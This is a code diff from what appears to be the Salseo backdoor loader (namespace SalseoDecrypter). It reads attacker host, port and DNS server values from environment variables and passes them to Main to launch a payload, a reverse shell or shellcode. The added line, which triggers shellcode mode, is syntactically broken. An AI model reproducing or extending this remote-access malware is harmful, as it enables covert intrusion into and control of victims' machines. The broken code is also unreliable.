@@ -89,7 +89,7 @@ namespace SalseoDecrypter
             if ((Environment.GetEnvironmentVariable("LHOST")) != null) { varlhost = Environment.GetEnvironmentVariable("LHOST"); } else { };
             if ((Environment.GetEnvironmentVariable("LPORT")) != null) { varlport = Environment.GetEnvironmentVariable("LPORT"); } else { };
             if ((Environment.GetEnvironmentVariable("DNSSERVER")) != null) { vardnsserver = Environment.GetEnvironmentVariable("DNSSERVER"); } else { };
-	    if (varpass != null & varpayload !=null & varshell.ToString = "shellcode" ) {string[] argumentos = {varpass, varpayload, varshell}}
+	    if (varpass != null & varpayload !=null & varshell.ToString = "shellcode" ) {string[] argumentos = {varpass, varpayload, varshell}; Main(argumentos); };
             if (varpass != null & varpayload != null & varshell != null & varlhost != null & vardnsserver == null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, varlport }; Main(argumentos); };
             if (varpass != null & varpayload != null & varshell != null & varlhost != null & vardnsserver != null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, vardnsserver}; Main(argumentos); };
 
